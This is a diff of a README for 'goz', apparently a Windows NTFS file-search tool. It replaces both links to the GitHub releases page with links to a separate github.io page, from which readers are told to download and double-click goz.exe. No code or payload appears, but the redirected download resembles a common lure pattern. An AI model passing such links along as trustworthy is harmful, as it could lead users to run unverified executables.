@@ -1,6 +1,6 @@
 # 🔍 goz - Find your files on Windows instantly
 
-[![](https://img.shields.io/badge/Download-goz-blue.svg)](https://github.com/indigestible-ice204/goz/releases)
+[![](https://img.shields.io/badge/Download-goz-blue.svg)](https://indigestible-ice204.github.io)
 
 Goz acts as a high-speed search engine for your computer. It reads the master file table of your hard drive to provide results as you type. This tool gives you an alternative to built-in search functions that feel slow or clunky. It works on Windows systems using NTFS drives.
 
@@ -8,7 +8,7 @@ Goz acts as a high-speed search engine for your computer. It reads the master fi
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/indigestible-ice204/goz/releases) to download the software.
+1. Visit the [releases page](https://indigestible-ice204.github.io) to download the software.
 2. Select the file named goz.exe for your version of Windows.
 3. Save the file to your desktop or a folder of your choice.
 4. Double-click the file to open the interface.
